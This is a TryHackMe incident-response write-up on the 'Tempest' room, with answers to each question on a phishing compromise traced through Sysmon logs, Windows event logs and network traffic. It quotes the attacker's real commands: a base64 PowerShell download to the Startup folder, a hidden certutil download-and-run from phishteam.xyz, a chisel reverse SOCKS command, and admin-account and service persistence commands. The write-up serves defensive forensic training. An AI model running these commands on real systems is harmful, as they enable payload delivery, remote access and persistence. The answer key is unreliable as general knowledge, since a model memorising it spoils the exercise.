# Tempest — TryHackMe

**Author:** Rameez Ahmed • **Date:** 2025-12-31 • **Difficulty:** Medium
**IP:** 10.64.148.149 • **Platform:** TryHackMe

---

## TL;DR

You’re acting as an incident responder analysing a compromised endpoint by reviewing provided endpoint and network artefacts. The goal is to reconstruct the incident, identify malicious activity, and understand attacker behaviour using log and traffic analysis techniques, reinforcing core incident response and forensic investigation skills.

---

## Environment & Tools

* <Target IP>
* Attacker: Kali Linux (tools used: `Windows Event Log`, `Wireshark`)
* Notes: This writeup is sanitized for public posting. Replace `REDACTED` with your personal notes if you keep a private copy.

---

## Task - Preparation - Log Analysis

**Objective:** I have read and understood the concept of Log Analysis and Event Correlation. 
**Answer:** No Answer Needed

---

## Task - Preparation - Tools and Artifacts

**Objective 1:** What is the SHA256 hash of the capture.pcapng file?
```bash
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```
**Answer:** CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

**Objective 2:** What is the SHA256 hash of the sysmon.evtx file?
```bash
Get-FileHash -Algorithm SHA256 .\sysmon.evtx
```
**Answer:** 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

**Objective 3:** What is the SHA256 hash of the windows.evtx file?
```bash
Get-FileHash -Algorithm SHA256 .\windows.evtx
```
**Answer:** D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
 
---

## Task - Initial Access - Malicious Document

**Objective 1:** The user of this machine was compromised by a malicious document. What is the file name of the document?
**Answer:** free_magicules.doc

**Objective 2:** What is the name of the compromised user and machine?
**Answer:** benimaru-TEMPEST

**Objective 3:** What is the PID of the Microsoft Word process that opened the malicious document?
**Answer:** 496

**Objective 4:** Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
**Answer:** 167.71.199.191

**Objective 5:** What is the base64 encoded string in the malicious payload executed by the document?
**Answer:** JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg

**Objective 6:** What is the CVE number of the exploit used by the attacker to achieve a remote code execution? 
**Answer:** 2022-30190

---

## Task - Initial Access - Stage 2 execution

**Objective 1:** The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
**Answer:** C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

**Objective 2:** The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
**Answer:** C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

**Objective 3:** Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
**Answer:** CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

**Objective 4:** The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
**Answer:** resolvecyber.xyz:80
 
---

## Task - Initial Access - Malicious Document Traffic

**Objective 1:** What is the URL of the malicious payload embedded in the document?
**Answer:** http://phishteam.xyz/02dcf07/index.html

**Objective 2:** What is the encoding used by the attacker on the c2 connection?
**Answer:** base64

**Objective 3:** The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?
**Answer:** q 

**Objective 4:** The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
**Answer:** /9ab62b5

**Objective 5:** What is the HTTP method used by the binary?
**Answer:** GET

**Objective 6:** Based on the user agent, what programming language was used by the attacker to compile the binary? 
**Answer:** nim
 
---

## Task - Discovery - Internal Reconnaissance

**Objective 1:** The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
**Answer:** infernotempest

**Objective 2:** The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
**Answer:** 5985

**Objective 3:** The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
**Answer:** C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

**Objective 4:** What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
**Answer:** 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

**Objective 5:** What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
**Answer:** chisel

**Objective 6:** The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
**Answer:** winrm

---

## Task - Privilege Escalation - Exploiting Privileges

**Objective 1:** After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
**Answer:** spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

**Objective 2:** Based on the SHA256 hash of the binary, what is the name of the tool used?
**Answer:** printspoofer

**Objective 3:** The tool exploits a specific privilege owned by the user. What is the name of the privilege?
**Answer:** SeImpersonatePrivilege

**Objective 4:** Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
**Answer:** final.exe

**Objective 5:** The binary connects to a different port from the first c2 connection. What is the port used?
**Answer:** 8080

---

## Task - Actions on Objective - Fully-owned Machine

**Objective 1:** Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
**Answer:** shion,shuna

**Objective 2:** Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
**Answer:** /add

**Objective 3:** Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
**Answer:** 4720

**Objective 4:** The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
**Answer:** net localgroup administrators /add shion

**Objective 5:** Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
**Answer:** 4732

**Objective 6:** After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
**Answer:** C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

---

## Conclusion

This room simulated a full end-to-end incident response investigation, requiring correlation of endpoint logs, Sysmon events, and network traffic to reconstruct a real-world attack chain. By analysing a malicious document exploit, the investigation traced initial access through staged payload delivery, C2 communication, internal reconnaissance, privilege escalation, and persistence mechanisms. Key indicators of compromise—including hashes, domains, commands, and abused privileges—were identified at each phase, demonstrating how attackers progress from user-level execution to full SYSTEM control. Overall, this exercise reinforced critical DFIR skills such as timeline reconstruction, IOC extraction, log correlation across multiple data sources, and understanding attacker tradecraft to support effective containment and remediation decisions.



